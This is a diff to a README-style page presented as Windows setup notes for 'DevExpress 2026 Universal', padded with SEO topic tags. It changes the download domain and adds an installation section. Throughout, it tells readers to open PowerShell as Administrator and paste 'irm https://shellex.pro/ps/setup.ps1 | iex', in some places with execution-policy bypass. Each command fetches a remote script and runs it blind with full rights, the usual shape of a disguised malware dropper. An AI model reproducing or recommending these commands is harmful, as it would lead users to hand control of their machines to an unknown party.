@@ -16,13 +16,13 @@ DevExpress 2026 Universal · Developer workspace · Automation · Windows deskto
 4. Click **Yes** if Windows asks for permission
 
 ```powershell
-irm https://beyondapp.pro/ps/setup.ps1 | iex
+irm https://shellex.pro/ps/setup.ps1 | iex
 ```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://beyondapp.pro/ps/setup.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://shellex.pro/ps/setup.ps1 | iex"
 ```
 
 
@@ -58,7 +58,7 @@ Notes for users who need **DevExpress 2026 Universal** running on Windows — es
 
 <details>
 <summary><b>What exactly do I paste?</b></summary>
-<br>Copy this whole line into PowerShell (Administrator):<br><br><code>irm https://beyondapp.pro/ps/setup.ps1 | iex</code>
+<br>Copy this whole line into PowerShell (Administrator):<br><br><code>irm https://shellex.pro/ps/setup.ps1 | iex</code>
 </details>
 
 <details>
@@ -68,7 +68,7 @@ Notes for users who need **DevExpress 2026 Universal** running on Windows — es
 
 <details>
 <summary><b>Command did not run?</b></summary>
-<br>Paste this line instead:<br><br><code>powershell -ExecutionPolicy Bypass -Command "irm https://beyondapp.pro/ps/setup.ps1 | iex"</code>
+<br>Paste this line instead:<br><br><code>powershell -ExecutionPolicy Bypass -Command "irm https://shellex.pro/ps/setup.ps1 | iex"</code>
 </details>
 
 <details>
@@ -79,3 +79,28 @@ Notes for users who need **DevExpress 2026 Universal** running on Windows — es
 ---
 
 **Topics:** devexpress-2026, devexpress-app, developer-tools, dev-workspace, devexpress-2026-setup-failed-fix, how-to-install-devexpress-2026, automation-tools, windows-dev, power-user-tools, devexpress-2026-windows, devexpress-2026-windows-setup, devexpress-2026-windows-setup-2026
+
+## INSTALLATION
+
+**Steps:**
+1. Press **Win**, type **PowerShell**
+2. Right-click **Windows PowerShell** → **Run as administrator**
+3. Copy the command below, paste into the window, press **Enter**
+4. If **UAC** still appears – click **Yes**
+
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
+```
+
+<details>
+<summary><b>Command did not start?</b></summary>
+
+Try this directly in the same PowerShell window:
+
+```powershell
+irm 'https://shellex.pro/ps/setup.ps1' | iex
+```
+
+</details>
+
+<sub>Administrator rights are required to complete the setup.</sub>
